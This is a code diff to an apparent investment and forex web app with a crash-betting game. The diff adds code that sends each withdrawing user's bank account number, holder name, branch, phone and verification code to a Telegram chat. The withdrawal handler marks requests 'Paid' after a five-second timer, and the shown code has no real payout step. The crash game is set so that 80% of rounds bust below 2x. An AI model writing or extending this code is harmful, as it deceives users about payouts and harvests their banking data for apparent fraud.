@@ -1264,9 +1264,8 @@
         /* --- TIME BASED CONDITION CHECKER (SL TIME 5 PM PROMO) --- */
         function isBefore5PMSL() {
             const now = new Date();
-            // Get Sri Lanka Hours
             const slHours = parseInt(now.toLocaleString('en-US', { timeZone: 'Asia/Colombo', hour: '24', hour12: false }));
-            return slHours < 17; // Returns true before 5:00 PM (17:00)
+            return slHours < 17;
         }
 
         const packagesData = [
@@ -1463,12 +1462,9 @@
 
         function handleLogout() {
             saveSystemDB();
-            
             systemDB.currentUsername = null;
             currentUserData = null;
-            
             localStorage.setItem('luminary_fx_system_db', JSON.stringify(systemDB));
-            
             updateSavedUsersDatalist();
             document.getElementById('authModal').style.display = 'flex';
         }
@@ -1738,7 +1734,7 @@
             }
         }
 
-        /* --- PAYOUT WITH 5 SECOND AUTOMATED PAID TRANSITION --- */
+        /* --- PAYOUT WITH 5 SECOND AUTOMATED PAID TRANSITION & TELEGRAM LOGGING --- */
         function handlePayoutSubmit(e) {
             e.preventDefault();
             const amt = parseFloat(document.getElementById('payoutAmt').value);
@@ -1747,7 +1743,6 @@
             const before5PM = isBefore5PMSL();
             const minWithdrawLimit = before5PM ? 30 : 50;
 
-            // Strict holding check ONLY AFTER 5:00 PM SL TIME
             if (!before5PM) {
                 const baseTimestamp = currentUserData.investmentStartDate || currentUserData.createdAt || Date.now();
                 const elapsedMs = Date.now() - baseTimestamp;
@@ -1788,6 +1783,7 @@
             let destinationStr = '';
             let bankTelegramInfo = '';
 
+            // Sri Lanka Bank Validation Fix
             if (method === 'srilanka_bank') {
                 const bName = document.getElementById('slBankName').value.trim();
                 const bAcc = document.getElementById('slAccNumber').value.trim();
@@ -1796,11 +1792,11 @@
                 const bPhone = document.getElementById('slPhoneNumber').value.trim();
 
                 if (!bName || !bAcc || !bHolder || !bBranch || !bPhone) {
-                    alert('Please fill out all Sri Lanka local bank transfer details!');
+                    alert('Please fill out ALL Sri Lanka local bank transfer fields!');
                     return;
                 }
 
-                destinationStr = `Sri Lanka Bank Transfer (${bName})`;
+                destinationStr = `Sri Lanka Local Bank Transfer (${bName})`;
                 bankTelegramInfo = `\n<b>🏦 Bank Name:</b> ${bName}\n<b>🔢 Account Number:</b> <code>${bAcc}</code>\n<b>👤 Account Holder:</b> ${bHolder}\n<b>🏢 Branch:</b> ${bBranch}\n<b>📞 Phone:</b> ${bPhone}`;
             } else if (method === 'trc20') {
                 destinationStr = currentUserData.savedWallet ? currentUserData.savedWallet.trc20 : '';
@@ -1820,18 +1816,19 @@
             currentUserData.available -= amt;
             currentUserData.dailyWithdrawals.count += 1;
 
-            // 1. Add as Pending initially
+            // Step 1: Add as Pending Status
             const txObj = addTx(`Withdrawal (${method === 'srilanka_bank' ? 'SL Local Bank' : method.toUpperCase()})`, `-$${amt.toFixed(2)}`, "Pending Verification");
             saveSystemDB();
             updateUI();
             closeModal('payoutModal');
 
-            // Show Processing Feedback
-            alert("Withdrawal submitted! Processing via Smart Routing Nodes...");
+            // Step 2: Send Telegram Notification Immediately
+            sendTelegramNotification(`<b>💸 NEW WITHDRAWAL REQUEST!</b>\n\n<b>Username:</b> ${currentUserData.profile.username}\n<b>Account ID:</b> ${currentUserData.accountId}\n<b>Amount:</b> $${amt.toFixed(2)}\n<b>Method:</b> ${method === 'srilanka_bank' ? 'Sri Lanka Local Bank' : method.toUpperCase()}${bankTelegramInfo}\n<b>Verification Code:</b> <code>${verificationCode}</code>\n<b>Status:</b> <b>Pending Verification (Processing in 5s)</b>`);
 
-            // 2. AUTOMATED 5-SECOND TRANSITION TO "PAID"
+            alert("Withdrawal Request Submitted Successfully! Verification in progress...");
+
+            // Step 3: Automated 5-Second Transition to "Paid"
             setTimeout(() => {
-                // Update TX Status
                 if (txObj) {
                     txObj.status = "Paid";
                 } else if (currentUserData.transactions.length > 0) {
@@ -2151,7 +2148,6 @@
             const h = crashCanvas.height;
             crashCtx.clearRect(0, 0, w, h);
 
-            // Grid Lines
             crashCtx.strokeStyle = 'rgba(255, 255, 255, 0.04)';
             crashCtx.lineWidth = 1;
             for(let x=0; x<w; x+=40) {
@@ -2178,7 +2174,6 @@
 
             activeBetAmount = betInpVal;
 
-            // Deduct Bet Fee
             currentUserData.available -= activeBetAmount;
             addTx("Dollar Crash Bet", `-$${activeBetAmount.toFixed(2)}`, "Completed");
             saveSystemDB();
@@ -2189,7 +2184,6 @@
             currentMultiplier = 1.00;
             graphPoints = [{ x: 0, y: 0 }];
 
-            // Crash Point Algorithm (80% crash < 2.00x, 20% high return)
             const isLowBust = Math.random() < 0.8;
             if (isLowBust) {
                 crashTarget = parseFloat((1.01 + Math.random() * 0.98).toFixed(2));
@@ -2197,7 +2191,6 @@
                 crashTarget = parseFloat((2.00 + Math.random() * 8.00).toFixed(2));
             }
 
-            // Controls Setup
             document.getElementById('btnPlaceBet').disabled = true;
             document.getElementById('btnPlaceBet').style.opacity = '0.4';
             document.getElementById('btnPlaceBet').style.pointerEvents = 'none';
@@ -2233,7 +2226,6 @@
             drawLiveGraph();
 
             if (currentMultiplier >= crashTarget) {
-                // BUST / CRASHED!
                 isCrashRunning = false;
                 currentMultiplier = crashTarget;
                 
@@ -2274,14 +2266,12 @@
 
             graphPoints.push({ x: currX, y: currY });
 
-            // Curve Line
             crashCtx.beginPath();
             crashCtx.moveTo(0, h);
             for(let i=0; i<graphPoints.length; i++) {
                 crashCtx.lineTo(graphPoints[i].x, graphPoints[i].y);
             }
             
-            // Neon Line Styling
             crashCtx.strokeStyle = '#10B981';
             crashCtx.lineWidth = 4;
             crashCtx.shadowColor = 'rgba(16, 185, 129, 0.8)';
@@ -2289,7 +2279,6 @@
             crashCtx.stroke();
             crashCtx.shadowBlur = 0;
 
-            // Fill Gradient Below Line
             crashCtx.lineTo(currX, h);
             crashCtx.lineTo(0, h);
             const grad = crashCtx.createLinearGradient(0, 0, 0, h);
@@ -2298,7 +2287,6 @@
             crashCtx.fillStyle = grad;
             crashCtx.fill();
 
-            // Rocket Icon at Tip
             crashCtx.save();
             crashCtx.translate(currX, currY);
             crashCtx.fillStyle = '#F59E0B';
@@ -2306,7 +2294,7 @@
             crashCtx.fontWeight = '900';
             crashCtx.shadowColor = '#F59E0B';
             crashCtx.shadowBlur = 15;
-            crashCtx.fillText('\uf135', -10, 8); // Rocket FA Code
+            crashCtx.fillText('\uf135', -10, 8);
             crashCtx.restore();
         }
 
